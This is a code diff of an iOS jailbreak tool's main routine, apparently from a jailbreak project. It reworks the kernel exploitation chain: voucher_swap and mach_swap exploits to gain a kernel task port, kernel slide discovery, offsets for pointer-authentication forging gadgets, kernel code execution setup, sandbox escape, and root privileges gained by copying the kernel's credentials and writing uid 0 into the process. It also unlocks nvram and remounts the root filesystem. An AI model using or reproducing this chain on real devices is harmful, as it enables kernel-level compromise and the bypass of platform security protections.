@@ -157,42 +157,6 @@ find_blr_x19_gadget()
     return blr_x19_addr;
 }
 
-// thx Siguza
-typedef struct {
-    uint64_t prev;
-    uint64_t next;
-    uint64_t start;
-    uint64_t end;
-} kmap_hdr_t;
-
-uint64_t zm_fix_addr(uint64_t addr) {
-    static kmap_hdr_t zm_hdr = {0, 0, 0, 0};
-    if (zm_hdr.start == 0) {
-        // xxx ReadKernel64(0) ?!
-        // uint64_t zone_map_ref = find_zone_map_ref();
-        LOG("zone_map_ref: %llx ", GETOFFSET(zone_map_ref));
-        uint64_t zone_map = ReadKernel64(GETOFFSET(zone_map_ref));
-        LOG("zone_map: %llx ", zone_map);
-        // hdr is at offset 0x10, mutexes at start
-        size_t r = kread(zone_map + 0x10, &zm_hdr, sizeof(zm_hdr));
-        LOG("zm_range: 0x%llx - 0x%llx (read 0x%zx, exp 0x%zx)", zm_hdr.start, zm_hdr.end, r, sizeof(zm_hdr));
-        
-        if (r != sizeof(zm_hdr) || zm_hdr.start == 0 || zm_hdr.end == 0) {
-            LOG("kread of zone_map failed!");
-            exit(EXIT_FAILURE);
-        }
-        
-        if (zm_hdr.end - zm_hdr.start > 0x100000000) {
-            LOG("zone_map is too big, sorry.");
-            exit(EXIT_FAILURE);
-        }
-    }
-    
-    uint64_t zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff);
-    
-    return zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp;
-}
-
 uint32_t IO_BITS_ACTIVE = 0x80000000;
 uint32_t IKOT_TASK = 2;
 uint32_t IKOT_NONE = 0;
@@ -647,11 +611,16 @@ uint32_t find_macho_header(FILE *file) {
     return off - 1;
 }
 
+int _pmap_load_trust_cache(uint64_t kernel_trust) {
+    return (int)kexecute(GETOFFSET(pmap_load_trust_cache), kernel_trust, 0, 0, 0, 0, 0, 0);
+}
+
 void jailbreak()
 {
     int rv = 0;
     bool usedPersistedKernelTaskPort = false;
     pid_t myPid = getpid();
+    uid_t myUid = getuid();
     uint64_t myProcAddr = 0;
     uint64_t myOriginalCredAddr = 0;
     uint64_t myCredAddr = 0;
@@ -753,9 +722,10 @@ void jailbreak()
                     voucher_swap();
                     prepare_for_rw_with_fake_tfp0(kernel_task_port);
                     if (MACH_PORT_VALID(tfp0) &&
-                        ISADDR((kernel_base = find_kernel_base())) &&
-                        ReadKernel32(kernel_base) == MACH_HEADER_MAGIC &&
-                        ISADDR((kernel_slide = (kernel_base - KERNEL_SEARCH_ADDRESS)))) {
+                        kernel_slide_init() &&
+                        ISADDR((kernel_slide) &&
+                        ISADDR((kernel_base = (kernel_slide + KERNEL_SEARCH_ADDRESS))) &&
+                        ReadKernel32(kernel_base) == MACH_HEADER_MAGIC)) {
                         exploit_success = true;
                     }
                     break;
@@ -834,11 +804,15 @@ void jailbreak()
         _assert(ISADDR(GETOFFSET(x)), message, true); \
         SETOFFSET(x, GETOFFSET(x) + kernel_slide); \
 } while (false)
-        PF(trustcache);
+        if (!auth_ptrs) {
+            PF(trustcache);
+        }
         PF(OSBoolean_True);
         PF(osunserializexml);
         PF(smalloc);
-        PF(add_x0_x0_0x40_ret);
+        if (!auth_ptrs) {
+            PF(add_x0_x0_0x40_ret);
+        }
         PF(zone_map_ref);
         PF(vfs_context_current);
         PF(vnode_lookup);
@@ -853,7 +827,18 @@ void jailbreak()
             PF(apfs_jhash_getvnode);
         }
         if (auth_ptrs) {
-            PF(pmap_load_trust_cache);
+            PF(paciza_pointer__l2tp_domain_module_start);
+            PF(paciza_pointer__l2tp_domain_module_stop);
+            PF(l2tp_domain_inited);
+            PF(sysctl__net_ppp_l2tp);
+            PF(sysctl_unregister_oid);
+            PF(mov_x0_x4__br_x5);
+            PF(mov_x9_x0__br_x1);
+            PF(mov_x10_x3__br_x6);
+            PF(kernel_forge_pacia_gadget);
+            PF(kernel_forge_pacda_gadget);
+            PF(IOUserClient__vtable);
+            PF(IORegistryEntry__getRegistryEntryID);
         }
 #undef PF
         found_offsets = true;
@@ -898,7 +883,7 @@ void jailbreak()
         _assert(ISADDR(myOriginalCredAddr), message, true);
         _assert(setuid(0) == ERR_SUCCESS, message, true);
         _assert(getuid() == 0, message, true);
-        set_platform_binary(myProcAddr);
+        set_platform_binary(myProcAddr, true);
         LOG("Successfully escaped Sandbox.");
     }
     
@@ -949,6 +934,17 @@ void jailbreak()
     UPSTAGE();
     
     {
+        // Initialize kexecute.
+        
+        LOG("Initializing kexecute...");
+        SETMESSAGE(NSLocalizedString(@"Failed to initialize kexecute.", nil));
+        init_kexecute();
+        LOG("Successfully initialized kexecute.");
+    }
+    
+    UPSTAGE();
+    
+    {
         if (prefs.dump_apticket) {
             NSString *originalFile = @"/System/Library/Caches/apticket.der";
             NSString *dumpFile = [homeDirectory stringByAppendingPathComponent:@"Documents/apticket.der"];
@@ -968,7 +964,7 @@ void jailbreak()
     UPSTAGE();
     
     {
-        if (prefs.overwrite_boot_nonce && !auth_ptrs) {
+        if (prefs.overwrite_boot_nonce) {
             // Unlock nvram.
             
             LOG("Unlocking nvram...");
@@ -1071,21 +1067,6 @@ void jailbreak()
         }
     }
     
-    if (auth_ptrs) {
-        goto out;
-    }
-    
-    UPSTAGE();
-    
-    {
-        // Initialize kexecute.
-        
-        LOG("Initializing kexecute...");
-        SETMESSAGE(NSLocalizedString(@"Failed to initialize kexecute.", nil));
-        init_kexecute();
-        LOG("Successfully initialized kexecute.");
-    }
-    
     UPSTAGE();
     
     {
@@ -1120,10 +1101,10 @@ void jailbreak()
             _assert(_vnode_put(devVnode) == ERR_SUCCESS, message, true);
             LOG("Successfully cleared dev vnode's si_flags.");
             
-            // Mount system snapshot.
+            // Mount RootFS.
             
-            LOG("Mounting rootfs...");
-            SETMESSAGE(NSLocalizedString(@"Unable to mount rootfs.", nil));
+            LOG("Mounting RootFS...");
+            SETMESSAGE(NSLocalizedString(@"Unable to mount RootFS.", nil));
             NSString *invalidRootMessage = NSLocalizedString(@"RootFS already mounted, delete OTA file from Settings - Storage if present and reboot.", nil);
             _assert(!is_mountpoint("/var/MobileSoftwareUpdate/mnt1"), invalidRootMessage, true);
             const char *rootFsMountPoint = "/private/var/tmp/jb/mnt1";
@@ -1142,7 +1123,7 @@ void jailbreak()
             _assert(runCommand("/sbin/mount", NULL) == ERR_SUCCESS, message, true);
             const char *systemSnapshotLaunchdPath = [@(rootFsMountPoint) stringByAppendingPathComponent:@"sbin/launchd"].UTF8String;
             _assert(waitForFile(systemSnapshotLaunchdPath) == ERR_SUCCESS, message, true);
-            LOG("Successfully mounted rootfs.");
+            LOG("Successfully mounted RootFS.");
             
             // Rename system snapshot.
             
@@ -1251,17 +1232,6 @@ void jailbreak()
         close(rootfd);
         LOG("Successfully remounted RootFS.");
         INSERTSTATUS(NSLocalizedString(@"Remounted RootFS.\n", nil));
-    }
-    
-    UPSTAGE();
-    
-    {
-        // Deinitialize kexecute.
-        
-        LOG("Deinitializing kexecute...");
-        SETMESSAGE(NSLocalizedString(@"Failed to deinitialize kexecute.", nil));
-        term_kexecute();
-        LOG("Successfully deinitialized kexecute.");
     }
 
     UPSTAGE();
@@ -1407,6 +1377,10 @@ void jailbreak()
         }
     }
     
+    if (auth_ptrs) {
+        goto out;
+    }
+    
     UPSTAGE();
     
     {
@@ -1545,6 +1519,19 @@ void jailbreak()
         dictionary[@"VnodeGetSnapshot"] = ADDRSTRING(GETOFFSET(vnode_get_snapshot));
         dictionary[@"FsLookupSnapshotMetadataByNameAndReturnName"] = ADDRSTRING(GETOFFSET(fs_lookup_snapshot_metadata_by_name_and_return_name));
         dictionary[@"APFSJhashGetVnode"] = ADDRSTRING(GETOFFSET(apfs_jhash_getvnode));
+        dictionary[@"PacizaPointerL2TPDomainModuleStart"] = ADDRSTRING(GETOFFSET(paciza_pointer__l2tp_domain_module_start));
+        dictionary[@"PacizaPointerL2TPDomainModuleStop"] = ADDRSTRING(GETOFFSET(paciza_pointer__l2tp_domain_module_stop));
+        dictionary[@"L2TPDomainInited"] = ADDRSTRING(GETOFFSET(l2tp_domain_inited));
+        dictionary[@"SysctlNetPPPL2TP"] = ADDRSTRING(GETOFFSET(sysctl__net_ppp_l2tp));
+        dictionary[@"SysctlUnregisterOid"] = ADDRSTRING(GETOFFSET(sysctl_unregister_oid));
+        dictionary[@"MovX0X4BrX5"] = ADDRSTRING(GETOFFSET(mov_x0_x4__br_x5));
+        dictionary[@"MovX9X0BrX1"] = ADDRSTRING(GETOFFSET(mov_x9_x0__br_x1));
+        dictionary[@"MovX10X3BrX6"] = ADDRSTRING(GETOFFSET(mov_x10_x3__br_x6));
+        dictionary[@"KernelForgePaciaGadget"] = ADDRSTRING(GETOFFSET(kernel_forge_pacia_gadget));
+        dictionary[@"KernelForgePacdaGadget"] = ADDRSTRING(GETOFFSET(kernel_forge_pacda_gadget));
+        dictionary[@"IOUserClientVtable"] = ADDRSTRING(GETOFFSET(IOUserClient__vtable));
+        dictionary[@"IORegistryEntryGetRegistryEntryID"] = ADDRSTRING(GETOFFSET(IORegistryEntry__getRegistryEntryID));
+        
         if (![[NSMutableDictionary dictionaryWithContentsOfFile:offsetsFile] isEqual:dictionary]) {
             // Log offsets.
             
@@ -2094,10 +2081,18 @@ void jailbreak()
         }
     }
 out:
+    term_kexecute();
+    set_platform_binary(myProcAddr, false);
+    _assert(give_creds_to_process_at_addr(myProcAddr, myOriginalCredAddr) == kernelCredAddr, message, true);
+    _assert(setuid(myUid) == ERR_SUCCESS, message, true);
+    _assert(getuid() == myUid, message, true);
+    WriteKernel64(GETOFFSET(shenanigans), Shenanigans);
     STATUS(NSLocalizedString(@"Jailbroken", nil), false, false);
     showAlert(@"Jailbreak Completed", [NSString stringWithFormat:@"%@\n\n%@\n%@", NSLocalizedString(@"Jailbreak Completed with Status:", nil), status, NSLocalizedString((prefs.exploit == mach_swap_exploit) && !usedPersistedKernelTaskPort ? @"The device will now respring." : @"The app will now exit.", nil)], true, false);
     if (sharedController.canExit) {
         if ((prefs.exploit == mach_swap_exploit) && !usedPersistedKernelTaskPort) {
+            WriteKernel64(myCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL), ReadKernel64(kernelCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)));
+            WriteKernel64(myCredAddr + koffset(KSTRUCT_OFFSET_UCRED_CR_UID), 0);
             _assert(restartSpringBoard(), message, true);
         } else {
             exit(EXIT_SUCCESS);
